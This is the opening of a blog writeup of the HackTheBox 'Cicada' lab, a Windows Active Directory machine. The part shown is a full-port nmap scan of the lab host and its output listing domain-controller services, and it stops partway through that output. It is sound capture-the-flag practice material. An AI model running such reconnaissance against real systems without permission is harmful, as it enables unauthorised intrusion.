<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
<head>
    










    







<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>






    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">

    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link rel="icon" href=/favicon.png>

    
    





  





  
  
  


<!-- Open Graph image and Twitter Card metadata -->

<title itemprop="name">pL4StiC - HtB Cicada</title>
<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Cicada />
<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Cicada />
<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Cicada />
<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Cicada />
<meta property="og:site_name" content="" />


<meta name="description" content="" />
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />


<base href="https://pL4sTiC1337.github.io/writeups/htb-cicada/" />
<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-cicada/" itemprop="url" />
<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-cicada/" />
<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-cicada/" />
<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-cicada/" />


<meta property="og:updated_time" content="2025-02-15T14:01:17-05:00" />


<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />

<meta name="robots" content="index,follow" />
<meta name="googlebot" content="index,follow" />



  
    <meta name="twitter:site" content="@pL4sTiC1337" />
    <meta name="twitter:creator" content="@pL4sTiC1337" />

<meta property="fb:admins" content="" />


<meta name="apple-mobile-web-app-title" content="" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black" />






<meta name="generator" content="Hugo 0.143.1">


    
    

<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">


    
    <style>
    body {
        --sidebar-bg-color: #202020;
        --sidebar-img-border-color: #515151;
        --sidebar-p-color: #909090;
        --sidebar-h1-color: #FFF;
        --sidebar-a-color: #FFF;
        --sidebar-socials-color: #FFF;
        --text-color: #222;
        --bkg-color: #FAF9F6;
        --post-title-color: #303030;
        --list-color: #5A5A5A;
        --link-color: #268BD2;
        --date-color: #515151;
        --table-border-color: #E5E5E5;
        --table-stripe-color: #F9F9F9;
        --code-color: #000;
        --code-background-color: #E5E5E5;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
        --moon-sun-color: #FFF;
        --moon-sun-background-color: #515151;
    }
    body.dark-theme {
        --text-color: #EEE;
        --bkg-color: #121212;
        --post-title-color: #DBE2E9;
        --list-color: #9D9D9D;
        --link-color: #268BD2;
        --date-color: #9A9A9A;
        --table-border-color: #515151;
        --table-stripe-color: #202020;
        --code-color: #FFF;
        --code-background-color: #515151;
        --code-block-color: #FFF;
        --code-block-background-color: #272822;
    }
    body {
        background-color: var(--bkg-color);
    }
</style>

</head>

    <body class="dark-theme">
        <div class="wrapper">
            <aside class="sidebar">
    <div class="container sidebar-sticky">
        <div class="light-dark" align="right">
    <button class="btn-light-dark" title="Toggle light/dark mode">
        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
        </svg>
        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
        </svg>
    </button>
</div>

        <div class="sidebar-about">
    <h1 class="brand">
        
            <a href="https://pL4sTiC1337.github.io/">
                <img src="/images/pl4stic.png" alt="brand image">
            </a>
        
        
            <a href="https://pL4sTiC1337.github.io/">
                <h1>pL4StiC</h1>
            </a>
        
    </h1>
    <p class="lead">
    My Ramblings...
    </p>
</div>

        <nav>
    <ul class="sidebar-nav">

        
        
        
        
            

            
                
                
                    <li class="heading">
                        <a href="/about/">About</a>
                    </li>
                    
                
            
                
                
            
                
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/posts/">Posts</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
                            </li>
                        
                    
                
            
                
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        
        
            

            
                
                
            
                
                
            
                
                
            
                
                
                    <li class="heading">
                        <a href="/writeups/">Writeups</a>
                    </li>
                    
                        <li class="sub-heading">
                            Recent
                        </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cicada/">HtB Cicada</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-forest/">HtB Forest</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-bounty/">Htb Bounty</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cascade/">HtB Cascade</a>
                            </li>
                        
                            <li class="bullet">
                                <a href="https://pL4sTiC1337.github.io/writeups/htb-escape/">HtB Escape</a>
                            </li>
                        
                    
                
            
            
                
                
            
                
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
                        
                
            
        

    </ul>
</nav>

        
    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
        </svg>
    </a>





    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
        </svg>
    </a>




    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
        </svg>
    </a>










    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
            </g>
        </svg>
    </a>





        <p class="footnote">
powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
    <br>
    &copy; 2025 . All rights reserved.
</p>

  </div>
</aside>

            <main class="content container">
                <div class="post">
  <div class="info">
  <h1 class="post-title">
    <a href="https://pL4sTiC1337.github.io/writeups/htb-cicada/">HtB Cicada</a>
  </h1>

  <div class="headline">
    <div>
      
      
      <time datetime=" 2025-02-15T14:01:17-0500" class="post-date">
        February 15, 2025
      </time>
      
      <span> - </span>
      <span class="reading-time">
        
          
        

        <span>9 mins read</span>
      </span>
    </div>

    
    <ul class="tags">
      
      <li class="tag-writeup">
        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
      </li>
      
      <li class="tag-hackthebox">
        <a href="https://pL4sTiC1337.github.io/tags/hackthebox">hackthebox</a>
      </li>
      
      <li class="tag-windows">
        <a href="https://pL4sTiC1337.github.io/tags/windows">windows</a>
      </li>
      
      <li class="tag-easy">
        <a href="https://pL4sTiC1337.github.io/tags/easy">easy</a>
      </li>
      
      <li class="tag-active directory">
        <a href="https://pL4sTiC1337.github.io/tags/active-directory">active directory</a>
      </li>
      
    </ul>
    
  </div>

  
  

  
</div>

  <p><img src="/images/Cicada.png" alt="HtB-Cicada"></p>
<h2 id="scanning">Scanning</h2>
<h3 id="nmap">nmap</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.84.61
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>53/tcp   open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-02-14 12:38:00Z<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
</span></span><span style="display:flex;"><span>|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5?
</span></span><span style="display:flex;"><span>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
</span></span><span style="display:flex;"><span>|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
</span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
